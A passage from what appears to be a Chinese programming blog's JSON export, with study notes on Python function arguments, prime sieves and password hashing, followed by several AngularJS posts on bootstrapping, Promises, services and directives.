初一看发现没看懂为什么，但是琢磨一下，发现其实此解释也可以这样理解：因为一个数组[]是变量，即我们看到的变量名L其实是指向内存中的一个地址，该地址在默认情况下在定义的时候已经确定了，若不传入新的数组变量名，则变量名L地址不会被改变，而传入变量名的地址会覆盖原定义的L变量名，所以若不是连续调用，则不会出现这个问题。 同时，python中的函数参数定义非常非常灵活，与其他语言有较大差别，需要多用多记。 参数类型共有5种：必选参数、默认参数、可变参数、命名关键字参数和关键字参数 参数组合同时由于tuple和dict的特色结构，即: 对于任意的函数，都可以通过类似func(args, *kw)的形式调用它，无论它的参数是如何定义的。 关于args和*kw 很多python函数的参数都是类似这样有前缀*或者**的，那么这里到底是什么意思呢？ 总的而言*参数名是可变参数，用于接收一个不确定传入参数数量情况，**参数名是关键字参数，用于接收一个字典， 而python又规定，可变参数和关键字参数的传入的参数可以是任意个数，所以，不管传入的是什么参数，多少参数，都可以通过args接收到，然后若又传入了配置字典参数，则通过**kw获取123456789101112131415161718192021def f1(a, b, c=0, *args, **kw): print('f1:','a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw)def f2(a, b, c=0, *, d, **kw): print('f2:','a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw)def f3(*args, **kw): #对f3来说，无论传入什么都可以接收到 print('f3:', 'args = ', args, 'kw =', kw)args = (1, 2, 3, 4)kw = &#123;'d': 99, 'x': '#'&#125;f1(*args, **kw) # f1: a = 1 b = 2 c = 3 args = (4,) kw = &#123;'d': 99, 'x': '#'&#125;args = (1, 2, 3)kw = &#123;'d': 88, 'x': '#'&#125;f2(*args, **kw) # f2: a = 1 b = 2 c = 3 d = 88 kw = &#123;'x': '#'&#125;f3(*args, **kw) # f3: args = (1, 2, 3) kw = &#123;'d': 88, 'x': '#'&#125;f3(1, 2, 3) # f3: args = (1, 2, 3) kw = &#123;&#125;f3(*args) # f3: args = (1, 2, 3) kw = &#123;&#125;f3(**kw) # f3: args = () kw = &#123;'d': 88, 'x': '#'&#125; 尾递归参考:递归函数 尾递归是指，在函数返回的时候，调用自身本身，并且，return语句不能包含表达式。这样，编译器或者解释器就可以把尾递归做优化，使递归本身无论调用多少次，都只占用一个栈帧，不会出现栈溢出的情况。 由filter学到的求素数的方法用filter求素数 在很多面试或者OJ中都有这样的求素数的题目，而用埃氏筛法可以非常简单而快速的求出指定区间内的所有素数。思想如下：从小开始，将每一个该素数的倍数都筛选掉即可。 首先，列出从2开始的所有自然数，构造一个序列：2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …取序列的第一个数2，它一定是素数，然后用2把序列的2的倍数筛掉：3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …取新序列的第一个数3，它一定是素数，然后用3把序列的3的倍数筛掉：5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …取新序列的第一个数5，然后用5把序列的5的倍数筛掉：7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, …不断筛下去，就可以得到所有的素数。 关于IO密集/计算密集型任务与语言的选择问题进程 vs. 线程这节谈到计算密集型 vs. IO密集型的问题，说到： 计算密集型任务的特点是要进行大量的计算，消耗CPU资源，比如计算圆周率、对视频进行高清解码等等，全靠CPU的运算能力。这种计算密集型任务虽然也可以用多任务完成，但是任务越多，花在任务切换的时间就越多，CPU执行任务的效率就越低，所以，要最高效地利用CPU，计算密集型任务同时进行的数量应当等于CPU的核心数。计算密集型任务由于主要消耗CPU资源，因此，代码运行效率至关重要。Python这样的脚本语言运行效率很低，完全不适合计算密集型任务。对于计算密集型任务，最好用C语言编写。第二种任务的类型是IO密集型，涉及到网络、磁盘IO的任务都是IO密集型任务，这类任务的特点是CPU消耗很少，任务的大部分时间都在等待IO操作完成（因为IO的速度远远低于CPU和内存的速度）。对于IO密集型任务，任务越多，CPU效率越高，但也有一个限度。常见的大部分任务都是IO密集型任务，比如Web应用。IO密集型任务执行期间，99%的时间都花在IO上，花在CPU上的时间很少，因此，用运行速度极快的C语言替换用Python这样运行速度极低的脚本语言，完全无法提升运行效率。对于IO密集型任务，最合适的语言就是开发效率最高（代码量最少）的语言，脚本语言是首选，C语言最差。 看到这里想到了php，node这样如python一样的解释型语言，然后联想到C++,C这样的编译语言，就能完美解释为什么C++和C在Web应用的不适合问题了。 关于散列算法（Hash）在登陆上的应用 hash密文存储用户密码，防止数据库直接查看密码 使用salt（盐值）解决简单口令的hash值相同的问题，（salt值需要保密） 若用户名不可更改，则可将用户名作为hash的一部分，解决相同密码hash值一样","categories":[{"name":"python","slug":"python","permalink":"https://github.com/xmoyKING/categories/python/"}],"tags":[{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"},{"name":"python","slug":"python","permalink":"https://github.com/xmoyKING/tags/python/"}]},{"title":"angularjs巩固实践-32-ng启动过程","slug":"angularjs32","date":"2017-07-31T14:56:53.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/31/angularjs32/","link":"","permalink":"https://github.com/xmoyKING/2017/07/31/angularjs32/","excerpt":"","text":"ng官方提供的开发指南中，给出了如下的启动过程图： 对上图详细分析，包括其省略的步骤， 1. 浏览器下载HTML/CSS/Javascript 打开一个网站，首先下载HTML文件，在下载HTML文件的同时，浏览器会开启一些辅助线程下载所关联的其他文件，如js、css、图片等 2. 浏览器开始构建DOM树 在下载文件的同时，浏览器同时构建DOM树，当网速慢时，能发现页面只出现一部分的DOM,同时这部分的DOM中内嵌的脚本也会执行 3. jqLite / jQuery初始化 这些脚本中最先导入的jqLite(若没有在ng之前引入jquery，则为内嵌ng中的jqLite，否则为jquery)会进行初始化工作，在document对象上注册DOMContentLoaded事件，程序通过调用$.ready(callback)将回调函数注册到这个事件中，该回调在执行之前还需要加载其他脚本。 4. angualr初始化 开始加载脚本中的angular或其子模块，包括自定义的app.js以及其他第三方模块，这些脚本会按引入的顺序开始各自的初始化过程。 各种ng模块的初始化过程大致相同，比如angular内置的名为“ng”的模块，其初始化步骤为： 按名字创建一个模块、所谓模块就是一个对象，它是其他angular对象的注册表 在此模块中注册各种ng对象，如Controller、Service、Directive等，比如下列常用的的一些方法：myModule.controller(&#39;xxx&#39;,...)其实就是$controllerProvider.register的快捷方式；myModule.service(&#39;xxx&#39;,...)其实就是$provider.service的快捷方式；myModule.directive(&#39;xxx&#39;,...)其实就是$compileProvider.directive的快捷方式。 这些元素注册后就形成了一个由名字和回调函数组成的映射表，当这些回调并不会执行。 在模块中注册“config回调函数”，它将在模块刚被初始化时执行。 在模块中注册“run回调函数”，它将在模块初始化完后执行。注：以上2、3、4、5的顺序是任意的，因为仅仅知识注册回调函数而已，并不会执行 5. jQuery启动 等页面及其直接引用的js文件都下载完后，DOM也已经构建完成，此时浏览器触发document对象的DOMContentLoaded事件，在$.ready中注册的回调函数也会在此时调用，在这个回调函数中，ng启动代码会执行。 6. ng启动 前面注册的未执行的各种ng回调函数，就是在此时开始逐个执行的，ng先在DOM中找一个带有ng-app（或其等价形式data-ng-app / ng:app / x-ng-app）指令的节点（这个指令通常会出现在body或html元素上，但也可以是任意元素，即一个页面可以有多个ng程序） 接下来，ng找到这个ng-app的节点后，调用angular.bootstrap(element, moduleName)，这里的element就是这个带有ng-app的节点，而moduleName就是ng-app=&quot;moduleName&quot;中指定的值moduleName 注：ng的自启动方式只会启用第一个ng-app的module，对于多个ng-app启动方式，必须手动执行angular.bootstrap方法来启动，所以推荐在页面中只使用一个ng-app，然后以Module和Controller来划分页面 7. 加载子模块 在ng将模块和DOM节点关联起来之前，这些DOM都是“死”的，它们和数据模型之间还没有建立联系，因此无法反应数据模型的变动，在本步之前都是准备工作，本步开始将其变成“活”的——即绑定数据，响应事件，自动更新等 在此阶段，ng会先创建一个注入器（injector），并将它关联到所在的节点上（在前面注册的ng对象都需要通过注入器才能被其他代码使用），然后对当前节点所关联的模块以及所依赖的模块进行初始化，这时，前面注册的所有“config回调函数”就会被顺序执行。 注：前面注册的大多数对象都无法使用，因为没有配置完成，在config回调函数中能使用的只有注册的常量（Constant）对象和Provider类。这个阶段是程序唯一可以直接访问Provider类对服务进行配置的地方。比如路由服务的Provider就是这个阶段进行初始化配置的，但这个路由服务配置其实只负责记录URL到“模版/控制器”组的映射表以供后续使用。 8. 启动子模块 模块加载完后，会执行所有的“run回调函数”，在此阶段，各种ng对象都可以使用，包括Service、Factory。然后，路由模块会获得控制权，使用$location服务解析当前页面的URL,然后根据这个URL查找相应的“模块/控制器”，然后准备渲染对应的页面。 9. 渲染页面 路由模块先创建一个Scope对象，并且加载模块，加载完后将它的内容传给$compile对象，$compile会先把它解析成一个静态DOM树，然后逐个扫描DOM树中的指令，通过对这些指令把Scope对象和DOM树关联起来，包括渲染内容的函数和进行事件处理的函数。最后用它替换特定指令所在的节点，在ngRoute中是带有ng-view的节点，在angular-ui-router中则是带ui-view的节点。 10. 数据绑定和摘要循环（Digest Loop） 此时，页面已经显示出来，但数据并未渲染，ng会自动使用Scope中的数据将绑定的指令渲染出来。 但，若此时用户修改数据会发生什么？理论上，应该自动渲染修改后的数据，但问题是：什么时候渲染这些更新的数据，同时做到高效及时。 此时就需要一个ng中的重要机制了：脏检查机制。简单的理解就是ng会给每一个Scope成员变量求一个摘要值(所谓摘要值，就是能唯一标识一个变量的值)，并且保存在一个变量中，当调用Scope对象的$digest/$apply方法时，会重新计算一遍摘要值，只要数据变化，自动更新界面，这个过程就称为摘要循环。不过，$digest函数是不需要应用程序自己调用的，$apply其实对它的包装。 但，即使是$apply函数也很少需要主动调用，因为在各种ng时间指令以及$timeout服务中，都会自动调用$apply来确保页面刷新。当使用第三方组件中的事件时一定要调用$apply，否则其事件处理函数中对scope中的变量的更新不会同步到界面中。 至此，典型的ng程序启动完成。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-31-Promise复习","slug":"angularjs31","date":"2017-07-28T14:36:56.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/28/angularjs31/","link":"","permalink":"https://github.com/xmoyKING/2017/07/28/angularjs31/","excerpt":"","text":"承诺（Promise）不是 Angular 首创的。作为一种编程模式，它出现在……1976 年，比JavaScript 还要古老得多。Promise 全称是 Futures and promises（未来与承诺）。要想深入了解，可以参见 http://en.wikipedia.org/wiki/Futures_and_promises。而在 JavaScript 世界中，一个广泛流行的库叫作 Q(https://github.com/kriskowal/q)。而Angular 中的 $q 就是从它引入的。 类比生活中的示例Promise 解决的是异步编程的问题，用生活中的一个例子对此做一个形象的讲解。 假设有一个家具厂，而它有一个 VIP 客户张先生。有一天张先生需要一个豪华衣柜，于是，他打电话给家具厂说：“我需要一个衣柜，回头做好了给我送来”，这个操作就叫 $q.defer()，也就是延期。因为这个衣柜不是现在要的，所以张先生这是在发起一个可延期的请求。 家具厂接下了这个订单，给他留下了一个回执号，并对他说：“我们做好了会给您送过去，放心吧”。这叫作 Promise，也就是给了张先生一个“承诺”。 这样，这个 defer 算是正式创建了，于是他把这件事记录在自己的日记上，并且同时记录了回执号，这个变量叫作 deferred，也就是已延期事件。 现在，张先生就不用再去想着这件事了，该做什么做什么，这就是“异步”请求的含义。 假设家具厂在一周后做完了这个衣柜，并如约送到了张先生家（包邮哦，亲），这就叫作 deferred.resolve（衣柜），也就是“问题已解决，这是您的衣柜”。而这时候张先生只取出一下这个“衣柜”参数就行了。而且，这个“邮包”中也不一定只有衣柜，还可以包含别的东西，比如厂家宣传资料、产品名录等。整个过程中轻松愉快，谁也没等谁，没有浪费任何时间。 假设家具厂在评估后发现这个规格的衣柜我们做不了，那么它就需要 deferred.reject （理由），也就是“我们不得不拒绝您的请求，因为……”。拒绝没有时间限制，可以发生在给出承诺之后的任何时候，甚至可能发生在快做完的时候。而且拒绝时候的参数也不仅仅限于理由，还可以包含一个道歉信，违约金之类的。总之，你想给他什么就给他什么，如果你觉得不会惹恼客户，那么不给也没关系。 假设家具厂发现，自己正好有一个符合张先生要求的存货，它就可以用 $q.when（现有衣柜）来兑现给张先生的承诺。于是，这件事立刻解决了，皆大欢喜。张先生可不在乎你是从头做的还是现有的成品，只要达到自己的品质要求就满意了。 假设这个家具厂对客户格外的细心，它还可以通过 deferred.notify（进展情况）给张先生发送进展情况的“通知”。 这样，整个异步流程圆满完成！无论成功还是失败，张先生都没有往里面投入任何额外的时间成本。 再扩展一下这个故事： 张先生又来订货了，这次他分多次订了一张桌子，三把椅子，一张席梦思。但他不希望今天收到个桌子，明天收到个椅子，后天又得签收一次席梦思，而是希望家具厂做好了之后一次性送过来，但是他当初又是分别下单的，那么他就可以重新跟家具厂要一个包含上述三个承诺的新承诺，这就是 $q.all([ 桌子承诺，椅子承诺，席梦思承诺 ])，这样，他就不用再关注以前的三个承诺了，直接等待这个新的承诺完成，到时候只要一次性签收了前面的这些承诺就行了。 回调地狱和 Promise通过上面这个生活中例子，已经了解到了异步和 Promise 的方式。为什么我们需要 Promise 呢？ JavaScript 是一门很灵活的语言，由于它寄宿在浏览器中以事件机制为核心，所以在 JavaScript 编码中存在很多的回调函数。这是一个高性能的编程模式，所以它衍生出了基于异步 I/O 的高性能 Nodejs 平台。但是如果不注意编码方法，那么就会陷入“回调地狱”，也有人称为“回调金字塔”。嵌套式的回调地狱，代码将会变得像意大利面条一样。如下边的嵌套回调函数一样：123456789async1(function()&#123; async2(function()&#123; async3(function()&#123; async4(function()&#123; .... &#125;); &#125;); &#125;);&#125;); 这样嵌套的回调函数，让代码的可读性变得很差，而且很难于调试和维护。所以为了降低异步编程的复杂性，开发人员一直寻找简便的方法来处理异步操作。其中一种处理模式称为 Promise，它代表了一种可能会长时间运行而且不一定必须完成的操作的结果。这种模式不会阻塞和等待长时间的操作完成，而是返回一个代表了承诺的（Promised）结果的对象。它通常会实现一种名叫 then 的方法，用来注册状态变化时对应的回调函数。 Promise 在任何时刻都处于以下三种状态之一：未完成（pending）、已完成（resolved）和拒绝（rejected）三个状态。以 CommonJS Promise/A 标准为例，Promise 对象上的 then 方法负责添加针对已完成和拒绝状态下的处理函数。then 方法会返回另一个 Promise 对象，以便于形成 Promise 管道，这种返回 Promise 对象的方式能够让开发人员把异步操作串联起来，如 then(resolvedHandler, rejectedHandler)。resolvedHandler 回调函数在 Promise 对象进入完成状态时会触发，并传递结果；rejectedHandler 函数会在拒绝状态下调用。 所以上边的嵌套回调函数可以修改为：1async1().then(async2).then(async3).catch(showError); 在 ES6 的标准版中已经包含了 Promise 的标准，很快它就将会从浏览器本身得到更好的支持。与此同时在 ES6 的标准版中，还引入了 Python 这类语言中的 generator（迭代器的生成器）概念，它本意并不是为异步而生的，但是它拥有天然的 yield 暂停函数执行的能力，并保存上下文，再次调用时恢复当时的状态，所以它也被很好地运用于 JavaScript 的异步编程模型中，其中最出名的案例当属 Node Express 的下一代框架 KOA 了。 在 ES7 的标准中将有可能引入 async 和 await 这两个关键词，来更大的简化 JavaScript 异步编程模型。就可以如下的方式以同步的方式编写异步代码：12345678910111213async function sleep(timeout) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(function() &#123; resolve(); &#125;, timeout); &#125;);&#125;(async function() &#123; console.log('做一些事情，' + new Date()); await sleep(3000); console.log('做另一些事情，' + new Date());&#125;)(); Angular 中的 Promise在 Angular 中大量使用着 Promise，最简单的是 $timeout 的实现:12345678910111213141516171819202122232425262728293031323334function timeout(fn, delay, invokeApply) &#123; // 创建一个延期请求 var deferred = $q.defer(), promise = deferred.promise, skipApply = (isDefined(invokeApply) &amp;&amp; !invokeApply), timeoutId; timeoutId = $browser.defer(function() &#123; try &#123; // 成功，将触发then的第一个回调函数 deferred.resolve(fn()); &#125; catch(e) &#123; // 失败，将触发then的第二个回调函数或catch的回调函数 deferred.reject(e); $exceptionHandler(e); &#125; finally &#123; delete deferreds[promise.$$timeoutId]; &#125; if (!skipApply) $rootScope.$apply(); &#125;, delay); promise.$$timeoutId = timeoutId; deferreds[timeoutId] = deferred; // 返回承诺 return promise;&#125;timeout.cancel = function(promise) &#123; if (promise &amp;&amp; promise.$$timeoutId in deferreds) &#123; deferreds[promise.$$timeoutId].reject('canceled'); delete deferreds[promise.$$timeoutId]; return $browser.defer.cancel(promise.$$timeoutId); &#125; return false;&#125;;","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"promise","slug":"promise","permalink":"https://github.com/xmoyKING/tags/promise/"}]},{"title":"angularjs巩固实践-30-服务复习","slug":"angularjs30","date":"2017-07-25T14:00:40.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/25/angularjs30/","link":"","permalink":"https://github.com/xmoyKING/2017/07/25/angularjs30/","excerpt":"","text":"服务是对公共代码的抽象，比如，如果在多个控制器中都出现了相似的代码，那么把它们提取出来，封装成一个服务，你将更加遵循 DRY 原则（即：不要重复你自己），在可维护性等方面获得提升。由于服务剥离了和具体表现相关的部分，而聚焦于业务逻辑或交互逻辑，它更加容易被测试和复用。 引入服务的首要目的是为了优化代码结构，而不是复用。复用只是一项结果，不是目标。所以，当发现代码中混杂了表现层逻辑和业务层逻辑的时候，就要认真考虑抽取服务了 — 哪怕它还看不到复用价值。 服务的概念通常是和依赖注入紧密相关的，Angular 中也一样。由于依赖注入的要求，服务都是单例的，这样我们才能把它们到处注入，而不用手动管理它们的生命周期，并容许Angular 实现“延迟初始化”等优化措施。 在 Angular 中，服务分成很多种类型： 常量（Constant）：用于声明不会被修改的值。 变量（Value）：用于声明会被修改的值。 服务（Service）：没错，它跟服务这个大概念同名，原作者在“开发者指南”中把这种行为比喻为“把自己的孩子取名叫‘孩子’ — 一个会气疯老师的名字”。事实上，同名的原因是 — 它跟后端领域的“服务”实现方式最为相似：声明一个类，等待Angular 把它 new 出来，然后保存这个实例，供它到处注入。 工厂（Factory）：它跟上面这个“服务”不同，它不会被 new 出来，Angular 会调用这个函数，获得返回值，然后保存这个返回值，供它到处注入。它被取名为“工厂”是因为：它本身不会被用于注入，我们使用的是它的产品。但是与现实中的工厂不同，它只产出一份产品，我们只是到处使用这个产品而已。 供应商（Provider）：“工厂”只负责生产产品，它的规格是不受我们控制的，而“供应商”更加灵活，我们可以对规格进行配置，以便获得定制化的产品。 事实上，除了 Constan- 外，所有这些类型的服务，背后都是通过 Provider 实现的，可以把它们看做让 Provider 更容易写的语法糖。一个明显的佐证是：当你使用一个未定义的服务时，Angular 给出的错误提示是它对应的 Provider 未找到，比如使用一个未定义的服务：test，那么 Angular 给出的提示是：Unknown provider: testProvider &lt;- test。 Provider 的声明方式如下：123456789angular.module('com.ngnice.app').provider('greeting', function() &#123; var _name = 'world'; this.setName = function(name) &#123; _name = name; &#125;; this.$ge- = function(/*这里可以放依赖注入变量*/) &#123; return 'Hello, ' + _name; &#125;;&#125;); 使用时：1234angular.module('com.ngnice.app').controller('SomeCtrl', function($scope, greeting) &#123; // 这里greeting应该等于'Hello, world'，怎么样，你猜对了吗？ $scope.message = greeting;&#125;) 对 Provider 进行配置时：123angular.module('com.ngnice.app').config(function(greetingProvider) &#123; greetingProvider.setName('wolf');&#125;); 容器的伪代码如下：1234567891011var instance = diContainer['greeting']; // 先找是否已经有了一个实例if (!angular.isUndefined(instance)) &#123; return instance; // 如果已经有了一个实例，直接返回&#125;var ProviderClass = angular.module('com.ngnice.app').lookup('greetingProvider');// 在服务名后面自动加上Provider后缀是Angular遵循的一项约定var provider = new ProviderClass(); // 把Provider实例化provider.setName('wolf');instance = provider.$get(); // 调用$get，并传入依赖注入参数diContainer['greeting'] = instance; // 把调用结果存下来return instance; 事实上，如果不需要对 name 参数进行配置，声明代码可以简化为：1angular.module('com.ngnice.app').value('greeting', 'Hello, world'); 这也就是需要这么多语法糖的原因。 服务的等价形式：12345angular.module('com.ngnice.app').service('greeting', function() &#123; this.sayHello = function(name) &#123; return 'Hello, ' + name; &#125;;&#125;); 等价于：12345678910angular.module('com.ngnice.app').provider('greeting', function() &#123; this.$ge- = function() &#123; var Greeting = function() &#123; this.sayHello = function(name) &#123; return 'Hello, ' + name; &#125;; &#125;; return new Greeting(); &#125;;&#125;; 使用时：123angular.module('com.ngnice.app').controller('SomeCtrl', function($scope, greeting) &#123; $scope.message = greeting.sayHello('world');&#125;); 工厂服务等价形式：123angular.module('com.ngnice.app').factory('greeting', function() &#123; return 'Hello, world';&#125;); 等价于：12345678angular.module('com.ngnice.app').provider('greeting', function() &#123; this.$ge- = function() &#123; var greeting = function() &#123; return 'Hello, world'; &#125;; return greeting();&#125;&#125;); 使用时：123angular.module('com.ngnice.app').controller('SomeCtrl', function($scope, greeting) &#123; $scope.message = greeting;&#125;); 在 Angular 源码中，它们的实现是这样的：1234567891011function factory(name, factoryFn) &#123; return provider(name, &#123; $get: factoryFn &#125;); &#125;function service(name, constructor) &#123; return factory(name, ['$injector', function($injector) &#123; return $injector.instantiate(constructor); &#125;]);&#125;function value(name, val) &#123; return factory(name, valueFn(val)); &#125; Angular 提供了这么多种形式的服务，那么在实践中该如何选择？可以遵循下列决策流程： 需要全局的可配置参数？用 Provider。 是纯数据，没有行为？用 Value。 只 new 一次，不用参数？用 Service。 拿到类，我自己 new 出实例？用 Factory。 拿到函数，我自己调用？用 Factory。 但是，还有另一种更方便的方式： 是纯数据时，先用 Value ；当发现需要添加行为时，改写为 Service ；或当发现需要通过计算给出结果时，改写为 Factory ；当发现需要进行全局配置时，改写为Provider。 最酷的是，这个过程对于使用者是透明的 — 它不需要因为实现代码的改动而更改原有代码。如上面 Value 和 Factory 的使用代码，仅仅从使用代码中分不出它是 Value 还是 Factory。 与其他 Service 不同，Constan- 不是 Provider 函数的语法糖。更重要的差别是，它的初始化时机非常早，可以在 angular.module(&#39;com.ngnice.app&#39;).config 函数中使用，而其他的服务是不能被注入到 config 函数中的。这也意味着，如果你需要在 config 中使用一个全局配置项，那么它就只能声明为常量，而不能声明为变量。12345类 型 Factory Service Value Constan- Provider可以依赖其他服务 是 是 否 否 是使用类型友好的注入 否 是 是 是 否在 config 阶段可用 否 否 否 是 是可用于创建函数 / 原生对象 是 否 是 是 是 可以依赖其他服务：由于 Value 和 Constan- 的特殊声明形式，显然没有进行依赖注入的时机。 使用类型友好的注入：这条没有官方的解释，可以理解为 — 由于 Factory 可以根据程序逻辑返回不同的数据类型，所以我们无法推断其结果是什么类型，也就是对类型不够友好。Provider 由于其灵活性比 Factory 更高，因此在类型友好性上和Factory 是一样的。 在 config 阶段可用：只有 Constan- 和 Provider 类型在 config 阶段可用，其他都是Provider 实例化之后的结果，所以只有 config 阶段完成后才可用。 可用于创建函数 / 原生对象：由于 Service 是 new 出来的，所以其结果必然是类实例，也就无法直接返回一个可供调用的函数或数字等原生对象。 如果确实需要对一个没有提供 Provider 的第三方服务进行配置，该怎么办呢？Angular 提供了另一种机制：decorator。这个 decorator 和前面提到过的装饰器型指令没有关系，它是用来改变服务的行为的。 比如有一个第三方服务，名叫 ui，它有一个 prompt 函数，我们不能改它源码，但需要让它每次弹出提问框时都在控制台输出一条记录，那么我们可以这样写：12345678910111213141516angular.module('com.ngnice.app').config(function($provide) &#123; // $delegate是ui的原始服务 $provide.decorator('ui', function($delegate) &#123; // 保存原始的prompt函数 var originalPrompt = $delegate.prompt; // 用自己的prompt替换 $delegate.prompt = function() &#123; // 先执行原始的prompt函数 originalPrompt.apply($delegate, arguments); // 再写一条控制台日志 console.log('prompt'); &#125;; // 返回原始服务的实例，但也可以返回一个全新的实例 return $delegate; &#125;)&#125;); 这种方式超级灵活，可以改写包括 Angular 系统服务在内的任何服务 — 事实上，angular-mocks 模块就是使用 decorator 来 MOCK $httpBackend、$timeout 等服务的。 不过，如果大幅修改了原始服务的逻辑，那么，这可能会给自己和维护者挖坑。俗话说，“不作死就不会死”。如果总结 decorator 的使用原则，那就是 — 慎用、慎用、慎用，如果确实想用，请务必遵循“ Liskov 代换”原则，并写好单元测试。特别是，如果想修改系统服务的工作逻辑，建议先多看几遍文档，确保正确理解了它的每一个细节！","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-29-指令复习","slug":"angularjs29","date":"2017-07-22T13:41:01.000Z","updated":"2017-12-06T14:50:08.899Z","comments":true,"path":"2017/07/22/angularjs29/","link":"","permalink":"https://github.com/xmoyKING/2017/07/22/angularjs29/","excerpt":"","text":"指令是ng中非常重要的概念，相当于一个自定义的HTML元素，在ng官方文档中称其为HTML语言的DSL(特定领域语言)扩展。 指令的使用场景和作用分为两种：组件型指令(component)和装饰型指令(decorator)，这种命名的方式是angular 2.x 提出的。 组件型指令主要是为了将复杂而庞大的View分离，使得页面的View具有更强的可读性和维护性，实现“高内聚低耦合”和“分离关注点”的有效手段；而装饰器型指令则是为 DOM 添加行为，使其具有某种能力，如自动聚焦（autoFocus）、双向绑定、可点击（ngClick）、条件显示 / 隐藏（ngShow/ngHide）等能力，同时它也是链接 Model 和 View 之间的桥梁，保持 View 和 Model 的同步。在 Angular 中内置的大多数指令，是属于装饰器型指令，它们负责收集和创建 $watch，然后利用 Angular 的“脏检查机制”保持 View 的同步。 对于组件型指令和装饰器型指令的这两种区分是非常重要的，它们在写法、业务含义、适用范围等方面都有非常明显的区别，理解了它们，对于我们日常的指令开发也具有很好的指导作用。 组件型指令组件型指令是一个小型的、自封装且内聚的一个独立体，它包含业务所需要显示的视图以及交互逻辑，比如： 需要在首页放置一个登录框和一个 FAQ 列表，如果把它们都直接写在首页的视图和控制器中，那么首页的视图和控制器将会变得非常庞大，这样不利于分工协作和页面的长期维护。 这时候更好的方案应该是，把它们拆分成两个独立的内聚的指令 login-panel 和 faq-list，然后分别将 &lt;login-panel&gt;&lt;/login-panel&gt; 和 &lt;faq-list&gt;&lt;/faq-list&gt; 两个指令嵌入到首页。 注意，这里拆出这两个指令的直接目的不是为了复用，更重要的目的应该是分离 View，促进代码结构的优化，达到更好的语义化和组件化，当然对于这样独立内聚的指令，有时还能意外地获得更好的复用性。 组件型指令应该是满足封装的自治性、内聚性的，它不应该直接引用当前页面的 DOM结构、数据等。如果存在需要的信息，则可以通过指令的属性传递或者利用后端服务接口来自我满足。如 login-panel 应该在其内部访问登录接口来实现自我的功能封装。它的Scope 应该是独立的（isolated），不需要对父作用域的结构有任何依赖，否则一旦父作用域的结构发生改变，可能它也需要相应地变更，这种封装是很脆弱的。更好的封装应该是“高内聚低耦合”的，内聚是描述组件内部实现了它所应该包含的逻辑功能，耦合则描述它和外部组件之间应该是尽量少的相互依赖。 组件型指令的写法通常是这样的：1234567891011121314151617// 声明一个指令angular.module('com.ngnice.app').directive('jobCategory', function () &#123; return &#123; // 可以用作HTML元素，也可以用作HTML属性 restrict: 'EA', // 使用独立作用域 scope: &#123; configure: '=' &#125;, // 指定模板 templateUrl: 'components/configure/tree.html', // 声明指令的控制器 controller: function JobCategoryCtrl($scope) &#123; ... &#125; &#125;;&#125;); 指令中 return 的这个结果，称之为“指令定义对象”。 restrict 属性用来表示这个指令的应用方式，它的取值可以是 E（元素）、A（属性）、C（类名）、M（注释）这几个字母的任意组合，工程实践中常用的是 E、A、EA 这三个，对于 C、M 笔者并不建议使用它们。对于组件型指令来说，标准的用法是 E，但是为了兼容 IE8，通常也支持一个 A，因为 IE8 的自定义元素需要先用 document.createElement 注册，用 A 可以省去注册的麻烦。 scope 有三种取值：不指定（undefined）/false、true 或一个哈希对象。 不指定或为 false 时，表示这个指令不需要新作用域。它直接访问现有作用域上的属性或方法，也可以不访问作用域。如果同一节点上有新作用域或独立作用域指令，则直接使用它，否则直接使用父级作用域。 为 true 时，表示它需要一个新作用域，可以跟本节点上的其他新作用域指令共享作用域，如果任何指令都没有新作用域，它就会创建一个。 为哈希对象时，表示它需要一个独立的（isolated）作用域。所谓独立作用域，是指独立于父作用域，它不会从父节点自动继承任何属性，这样的话，就不会无意间引用到父节点上的属性，导致意料之外的耦合。 要注意，一个节点上如果已经出现了一个独立作用域指令，那么就不能再出现另一个独立作用域指令或者新作用域指令，否则使用 scope 的代码将无法区分两者，如果自动将两个作用域合并，又会失去“独立性”。总之，记住一句话：独立作用域指令是“排它”的。 那么哈希对象的内容呢？它表示的是属性绑定规则，如：12345678&#123; // 绑定字面量 name: '@', // 绑定变量 details: '=', // 绑定事件 onUpdate: '&amp;'&#125; 这里我们绑定了三个属性，以 &lt;user-details name=&#39;test&#39; details=&#39;details&#39; on-update=&#39;updateIt(times)&#39;&gt;&lt;/user-details&gt; 为例， name 的 值 将 被 绑 定 为 字 符 串 ‘test’。 details 的值不是 ‘details’，而是绑定到父页面 scope 上一个名为 details 的变量，当父页面 scope 的details 变量变化时，指令中的值也会随之变化 — 即使绑定到 number 等原生类型也一样。 onUpdate 绑定的则是一个回调函数，它是父页面 scope 上一个名为 updateIt 的函数。当指令代码中调用 scope.onUpdate() 的时候，父页面 scope 的 updateIt 就会被调用。当然，name 也同样可以绑定到变量，但是要通过绑定表达式的方式，比如 &lt;user-details name=&quot;&quot;&gt;&lt;/user-details&gt; 中，name 将会绑定到父页面 scope 中的 name 变量，并且也会同步更新。 对于组件型指令，更重要的是内容信息的展示，所以一般不涉及指令的link 函数，而应该尽量地将业务逻辑放置在 Controller 中。组件化的开发方式以及组件化的复用，是在前端开发中一直追求的一个理想目标。从最初的 